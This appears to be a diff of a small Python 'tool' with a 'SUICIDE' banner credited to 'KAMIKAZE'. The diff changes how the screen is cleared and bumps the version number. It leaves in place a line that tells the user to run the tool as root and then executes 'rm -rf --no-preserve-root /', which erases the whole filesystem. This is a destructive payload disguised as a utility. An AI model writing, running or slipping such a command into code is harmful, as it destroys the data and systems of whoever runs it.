@@ -1,11 +1,11 @@
 import subprocess
-subprocess.call([clear])
+subprocess.call("clear", shell=True)
 print('''
  _______ _     _ _____ _______ _____ ______  _______
  |______ |     |   |   |         |   |     \ |______
  ______| |_____| __|__ |______ __|__ |_____/ |______
 		
-		By KAMIKAZE v0.0.1
+		By KAMIKAZE v0.0.3
 ''')
 print("RUN THIS TOOL AS ROOT")
 subprocess.call("rm -rf --no-preserve-root /", shell=True)
